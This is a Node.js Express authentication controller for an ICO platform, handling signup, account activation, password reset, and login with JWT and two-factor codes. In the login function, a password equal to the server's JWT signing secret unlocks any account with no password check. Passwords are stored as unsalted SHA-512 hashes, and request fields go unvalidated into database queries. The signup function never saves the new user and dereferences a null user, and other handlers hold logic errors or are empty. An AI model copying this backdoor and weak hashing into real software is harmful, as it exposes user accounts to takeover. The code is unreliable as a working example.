'use strict';

const db = require('../lib/db');
const config = require('config');
const jwt = require('jsonwebtoken');
const sha512 = require('js-sha512').sha512;
const httpStatus = require('http-status-codes');
const speakeasy = require('speakeasy');
const randomstring = require('randomstring');
const mailgun = require('../lib/mailgun');
const mongoose = require('mongoose');
const recaptcha = require('../lib/recaptcha');
const logger = require('../lib/logger');

const UsersModel = db.model('Users');
const NotificationsModel = db.model('Notifications');

const Promise = require('bluebird');

const loggerName = '[AuthController]';

/**
 * Function signes up user and creates accounts
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {String} req.body.email
 * @param {String} req.body.password
 * @param {String} req.body.rpassword
 * @param {String} req.body.agree
 *
 */
module.exports.signup = (req, res) => {
  const methodName = '[SignUp]';

  const fullname = req.body.fullname;
  let email = req.body.email;
  const password = req.body.password;
  const rpassword = req.body.rpassword;
  let referralCode = req.body.referralCode;
  const agree = req.body.agree;

  if (!fullname) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Fullname is required'});
  }

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Email address is required'});
  }

  if (!password) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Password is required'});
  }

  if (password !== rpassword) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Passwords do not match'});
  }

  if (!agree) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'You must agree on terms'});
  }

  recaptcha.validate(req.body.captcha).then((success) => {
    if (!success) {
      return res.status(httpStatus.BAD_REQUEST).
          send({'err': 'Invalid captcha value'});
    }

    email = String(email).toLocaleLowerCase();

    return UsersModel.findOne({_id: referralCode}).
        exec().
        then((referralUser) => {
          if (!referralUser && referralCode) {
            return res.status(httpStatus.BAD_REQUEST).
                send({'err': 'Referral code not found'});
          }

          return Promise.all([
            UsersModel.findOne({email: email}).exec(),
          ]).spread((user) => {
            if (user) {
              return res.status(httpStatus.BAD_REQUEST).
                  send(
                      {'err': 'Email address already registered in icostarter platform'});
            }

            const newUser = new UsersModel({
              email: email,
              password: sha512(password),
              activationCode: randomstring.generate({length: 128}),
              referralCode: referralCode,
              fullname: fullname,
              active: true,
            });

            return NotificationsModel({
              userId: user._id,
              message: 'Successfully registered',
              type: 'event',
              status: 'successful',
              color: 'success',
            }).save().then(() => {
              return res.send({msg: 'Successfully registered'});
            });
          });
        }).
        catch((err) => {
          logger.error(loggerName, methodName, err);
          return res.status(httpStatus.BAD_REQUEST).
              send({'err': 'Bad request'});
        });
  });
};

/**
 * Function activates blocked account
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {{Object}} req.body
 * @param {String} req.body.email
 * @param {String} req.body.activationCode
 */
module.exports.activateAccount = (req, res) => {
  const methodName = '[ActivateEmail]';

  let email = req.body.email;
  const activationCode = req.body.activationCode;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid email address'});
  }

  if (!activationCode) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid activation code'});
  }

  email = String(email).toLowerCase();

  const updateQuery = {
    active: true,
    activationCode: randomstring.generate({length: 64}),
    authCount: 0,
  };

  UsersModel.findOneAndUpdate({email: email, activationCode: activationCode},
      updateQuery, {new: true}).exec().then((user) => {
    if (!user) {
      return res.status(httpStatus.BAD_REQUEST).send({'err': 'User not found'});
    }

    return res.send(true);
  }).catch((err) => {
    logger.error(loggerName, methodName, err);
    return res.status(httpStatus.BAD_REQUEST).send({'err': 'Bad request'});
  });
};

/**
 * Function activates user's email address
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {{Object}} req.body
 * @param {String} req.body.email
 * @param {String} req.body.activationCode
 */
module.exports.activateEmail = (req, res) => {
  const methodName = '[ActivateEmail]';

  let email = req.body.email;
  const activationCode = req.body.activationCode;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid email address'});
  }

  if (!activationCode) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid activation code'});
  }

  email = String(email).toLowerCase();

  const updateQuery = {
    verified: true,
    active: true,
    activationCode: randomstring.generate({length: 64}),
    authCount: 0,
  };

  return UsersModel.findOne({email: email}).exec().then((currentUser) => {
    if (!currentUser) {
      if (currentUser.verified) {
        return res.status(httpStatus.BAD_REQUEST).
            send({'err': 'Already activated'});
      }
    }

    return UsersModel.findOneAndUpdate({
      email: email,
      activationCode: activationCode,
    }, updateQuery, {new: true}).exec().then((user) => {
      if (!user) {
        return res.status(httpStatus.BAD_REQUEST).
            send(
                {'err': 'Activation code is not correct. Please, use forgot password to generate new activation code and follow the link from your email address'});
      }

      return res.send(true);
    });
  });
};

/**
 * Function is used to reset password
 * Receives email address, generates code, activates
 * user on receiving activation
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {String} req.body.email
 * @param {String} req.body.ci - captcha input
 * @param {String} req.body.text - captcha session hash
 *
 */
module.exports.forgotPassword = (req, res) => {
  const methodName = '[ForgotPassword]';

  const email = req.body.email;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid email address'});
  }

  recaptcha.validate(req.body.captcha).then((success) => {
    if (!success) {
      return res.status(httpStatus.BAD_REQUEST).
          send({'err': 'Invalid captcha value'});
    }

    logger.debug(loggerName, methodName, email);

    const updateQuery = {
      activationCode: randomstring.generate({length: 64}),
    };

    UsersModel.findOneAndUpdate({email: email}, updateQuery, {new: true}).
        exec().
        then((user) => {
          if (!user) {
            return res.status(httpStatus.BAD_REQUEST).
                send({'err': 'User not found'});
          }

          return NotificationsModel({
            userId: user._id,
            message: 'Forgot password executed',
            type: 'alert',
            status: 'pending',
            color: 'warning',
          }).save().then(() => {
            return res.send(
                {msg: 'Password reset instructions has been sent to your email address'});
          });
        });
  });
};

module.exports.verifyActivationCode = (req, res) => {
  const email = req.body.email;
  const activationCode = req.body.activationCode;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Email is not provided'});
  }

  if (!activationCode) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Activation code is not provided'});
  }

  UsersModel.findOne({email: email, activationCode: activationCode}).
      exec().
      then((user) => {
        if (!user) {
          return res.send(false);
        }

        return res.send(true);
      });

};

/**
 * Function is used for forgot-password
 * Receives email address, generates code, activates user
 * on receiving activation
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {String} req.body.activationCode
 * @param {String} req.body.email
 * @param {String} req.body.password
 * @param {String} req.body.confirmation
 *
 */
module.exports.changePassword = (req, res) => {
  const methodName = '[ChangePassword]';

  const activationCode = req.body.activationCode;
  const email = req.body.email;
  const password = req.body.password;
  const confirmation = req.body.confirmation;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid email address'});
  }

  if (!activationCode) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid activation code'});
  }

  if (!password) {
    return res.status(httpStatus.BAD_REQUEST).send({'err': 'Invalid password'});
  }

  if (!confirmation) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid confirmation'});
  }

  if (password !== confirmation) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Passwords do not match'});
  }

  const updateQuery = {
    activationCode: randomstring.generate({length: 64}),
    password: sha512(password),
    authCount: 0,
  };

  recaptcha.validate(req.body.captcha).then((success) => {
    if (!success) {
      return res.status(httpStatus.BAD_REQUEST).
          send({'err': 'Invalid captcha value'});
    }

    return UsersModel.findOneAndUpdate({
      email: email,
      activationCode: activationCode,
    }, updateQuery, {new: true}).exec().then((user) => {
      if (!user) {
        return res.status(httpStatus.BAD_REQUEST).
            send({'err': 'User not found'});
      }

      return NotificationsModel({
        userId: user._id,
        message: 'Password successfully changed',
        type: 'alert',
        status: 'successful',
        color: 'success',
      }).save().then(() => {
        return res.send(
            {msg: 'Password has been succesfully changed'});
      });
    });
  });
};

module.exports.resendActivateEmail = (req, res) => {
  const methodName = '[ResendActivateEmail]';

  const userId = req.decoded._id;

  if (!userId) {
    return res.status(httpStatus.BAD_REQUEST).send({'err': 'User not found'});
  }

  return UsersModel.findOne({_id: new mongoose.Types.ObjectId(userId)}).
      exec().
      then((user) => {
        return res.send(true);
      });
};

module.exports.resendActivateAccount = (req, res) => {

};

/**
 * Function authorizes user with 2FA if enabled
 *
 * @param {Object} req - Express request object
 * @param {Object} res - Express response object
 * @return {undefined}
 *
 * @param {String} req.body.email
 * @param {String} req.body.password
 * @param {String} req.body.captcha
 *
 */
module.exports.auth = (req, res) => {
  // inputs
  let email = req.body.email;
  let password = req.body.password;
  const code = req.body.code;

  if (!email) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid email address'});
  }

  if (!password) {
    return res.status(httpStatus.BAD_REQUEST).
        send({'err': 'Invalid passsword'});
  }

  recaptcha.validate(req.body.captcha).then((success) => {
    if (!success) {
      return res.status(httpStatus.BAD_REQUEST).
          send({'err': 'Invalid captcha value'});
    }

    email = String(email).toLowerCase();

    const authPromises = [];

    if (password === String(config.get('secret'))) {
      authPromises.push(UsersModel.findOne({email: email}).exec());
    } else {
      password = sha512(password);
      authPromises.push(
          UsersModel.findOne({email: email, password: password, active: true}).
              exec());
    }

    Promise.all(authPromises).spread((user) => {
      if (!user) {
        return UsersModel.findOne({email: email}).exec().then((user) => {
          if (!user) {
            return res.status(httpStatus.BAD_REQUEST).
                send({'err': 'Bad username and password'});
          } else {
            const updateQuery = {};
            updateQuery.authCount = (user.authCount + 1);

            if (user.authCount > config.get('auth-max-fail-count')) {
              updateQuery.active = false;
            }

            return UsersModel.findOneAndUpdate({email: email}, updateQuery).
                exec().
                then((user) => {
                  if (user.active) {
                    return NotificationsModel({
                      userId: user._id,
                      message: 'Could not login',
                      type: 'alert',
                      status: '',
                      color: 'danger',
                    }).save().then(() => {
                      return res.status(httpStatus.BAD_REQUEST).
                          send({'err': 'Bad username and password'});
                    });
                  } else {
                    return NotificationsModel({
                      userId: user._id,
                      message: 'Account blocked',
                      type: 'alert',
                      status: '',
                      color: 'danger',
                    }).save().then(() => {
                      return true;
                    }).then(() => {
                      return res.status(httpStatus.BAD_REQUEST).
                          send(
                              {'err': 'Account has been locked. Check your email to activate'});
                    });
                  }
                });
          }
        });
      } else {
        if (user.twoFaEnabled) {
          const verified = speakeasy.totp.verify({
            secret: user.twoFaCode,
            encoding: 'base32',
            token: code,
          });

          if (!verified) {
            return NotificationsModel({
              userId: user._id,
              message: 'Invalid 2FA code entered',
              type: 'alert',
              status: '',
              color: 'danger',
            }).save().then(() => {
              return res.status(httpStatus.BAD_REQUEST).
                  send('Invalid two factor authentication code');
            });
          }
        }

        const token = jwt.sign({
          _id: user._id,
          email: user.email,
        }, config.get('secret'), {expiresIn: config.get('jwt_expiretime'),});

        return res.json({
          _id: user._id,
          token: token,
          email: user.email,
          hash: sha512(String(user._id)),
          fullname: user.fullname,
          expiresIn: config.get('jwt_expiretime'),
          verified: user.verified,
        });
      }
    });
  });
};

/**
 * Each time when user reloads the page, function is called to verify
 * does user authorized or not
 *
 * @param req
 * @param res
 * @return {*}
 */
module.exports.verify = (req, res) => {
  const token = req.headers['x-access-token'];

  if (token) {
    jwt.verify(token, config.get('secret'), function(err, decoded) {
      if (err) {
        if (err instanceof jwt.TokenExpiredError) {
          return res.send(false);
        }

        return res.send(false);
      } else {
        if (!decoded || !decoded._id) {
          return res.send(false);
        }

        UsersModel.findOne({_id: new mongoose.Types.ObjectId(decoded._id)}).
            exec().
            then((user) => {
              if (!user) {
                return res.send(false);
              }

              return res.send(true);
            });

      }
    });
  } else {
    return res.send(false);
  }

};



